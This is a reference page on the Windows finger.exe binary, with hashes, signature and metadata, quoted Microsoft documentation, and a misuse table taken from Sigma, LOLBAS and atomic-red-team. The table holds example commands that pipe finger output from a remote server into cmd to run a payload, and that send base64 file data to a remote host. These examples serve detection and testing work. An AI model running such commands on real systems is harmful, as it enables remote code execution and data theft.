﻿---
title: finger.exe | TCPIP Finger Command
excerpt: What is finger.exe?
---

# finger.exe 

* File Path: `C:\Windows\SysWOW64\finger.exe`
* Description: TCPIP Finger Command

## Hashes

Type | Hash
-- | --
MD5 | `12F4A450805172B74227AB0D3F7AF151`
SHA1 | `2EC3DDA4BB72FC136774F84A1FE15B1CCE047C9F`
SHA256 | `621F2CC798234A31B17B90CFC91B6E6F9A3A249E37EA9C235AB83E39FA4C7E63`
SHA384 | `83DE091890CE4A0A327616CC1B52E3BE755F13F79B18C54DEDBC691AFBB816B12204370AB3D0E1371798DA92D86688A7`
SHA512 | `384B922062077EED7983E751180C61F34716CF94777AF9C4C6EE7B4B3559DDCAADE662060D0B8C9A34F85201B1099410F3C1E8405CBAE9CD87ED022A6D07DECB`
SSDEEP | `192:W9W/jd6t+vAJLcH9CXDYqTgDmXfmXp6MvERjJ6wWAW60WjTFf:9bLvAJY9C0qTDX+XROjJ15W60Wj`
IMP | `DD36F61A81704582E5C476E946B3969A`
PESHA1 | `F35A8B7999B3C0354CDDDF79B5A9E10C21133ADF`
PE256 | `64686262DCA3231F4D8D55DB4065E57BEE0946B9DC27B790ACF7D072979F6BB1`

## Runtime Data

### Usage (stdout):
```cmhg

[Default-PC]

```

### Usage (stderr):
```cmhg

Displays information about a user on a specified system running the
Finger service. Output varies based on the remote system.

FINGER [-l] [user]@host [...]

  -l        Displays information in long list format.
  user      Specifies the user you want information about. Omit the user
            parameter to display information about all users on the
            specifed host.
  @host     Specifies the server on the remote system whose users you
            want information about.


```

### Child Processes:
conhost.exe

### Open Handles:

Path | Type
-- | --
(R-D)   C:\Windows\System32\en-US\finger.exe.mui | File
(RW-)   C:\Users\user | File
(RW-)   C:\Windows | File
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000004.db | Section
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000004.db | Section
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*cversions.2.ro | Section
\BaseNamedObjects\NLS_CodePage_1252_3_2_0_0 | Section
\BaseNamedObjects\NLS_CodePage_437_3_2_0_0 | Section


### Loaded Modules:

Path |
-- |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\wow64.dll |
C:\Windows\System32\wow64cpu.dll |
C:\Windows\System32\wow64win.dll |
C:\Windows\SysWOW64\finger.exe |


## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: finger.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/68
* VirusTotal Link: https://www.virustotal.com/gui/file/621f2cc798234a31b17b90cfc91b6e6f9a3a249e37ea9c235ab83e39fa4c7e63/detection/

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\WINDOWS\SysWOW64\finger.exe](finger.exe-548BD137905CFDF1D1CE54682305FA3D.md) | 52

## Possible Misuse

*The following table contains possible examples of `finger.exe` being misused. While `finger.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_finger_usage.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_finger_usage.yml) | `title: Finger.exe Suspicious Invocation`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_finger_usage.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_finger_usage.yml) | `description: Detects suspicious aged finger.exe tool execution often used in malware attacks nowadays`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_finger_usage.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_finger_usage.yml) | `Image\|endswith: '\finger.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_finger_usage.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_finger_usage.yml) | `- Admin activity (unclear what they do nowadays with finger.exe)`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `Name: Finger.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `Description: Displays information about a user or users on a specified remote computer that is running the Finger service or daemon`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `- Command: finger user@example.host.com \| more +2 \| cmd`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `Description: 'Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user"; the result could contain malicious shellcode which is executed by the cmd process.'`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `- Path: c:\windows\system32\finger.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `- Path: c:\windows\syswow64\finger.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `- IOC: finger.exe should not be run on a normal workstation.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Finger.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Finger.yml) | `- IOC: finger.exe connecting to external resources.`{:.highlight .language-yaml} | 
[malware-ioc](https://github.com/eset/malware-ioc) | [nouns.txt](https://github.com/eset/malware-ioc/blob/master/kryptocibule/nouns.txt) | `finger`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #16: File download with finger.exe on Windows [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #16: File download with finger.exe on Windows [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | - [Atomic Test #16 - File download with finger.exe on Windows](#atomic-test-16---file-download-with-fingerexe-on-windows) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | ## Atomic Test #16 - File download with finger.exe on Windows | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/ | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | finger base64_filedata@#{remote_host} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## finger

>Applies to: Windows Server 2022, Windows Server 2019, Windows Server 2016, Windows Server 2012 R2, Windows Server 2012

Displays information about users on a specified remote computer (typically a computer running UNIX) that is running the finger service or daemon. The remote computer specifies the format and output of the user information display. Used without parameters, **finger** displays help.

> [!IMPORTANT]
> This command is available only if the Internet Protocol (TCP/IP) protocol is installed as a component in the properties of a network adapter in Network Connections.

### Syntax

```
finger [-l] [<user>] [@<host>] [...]
```

#### Parameters

| Parameter | Description |
| --------- | ----------- |
| -l | Displays user information in long list format. |
| `<user>` | Specifies the user about which you want information. If you omit the *user* parameter, this command displays information about all users on the specified computer. |
| `@<host>` | Specifies the remote computer running the finger service where you are looking for user information. You can specify a computer name or IP address. |
| /? | Displays help at the command prompt. |

##### Remarks

- You must prefix **finger** parameters with a hyphen (-) rather than a slash (/).

- Multiple `user@host` parameters can be specified.

#### Examples

To display information for *user1* on the computer *users.microsoft.com*, type:

```
finger user1@users.microsoft.com
```

To display information for *all users* on the computer *users.microsoft.com*, type:

```
finger @users.microsoft.com
```

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

---



MIT License. Copyright (c) 2020-2021 Strontic.


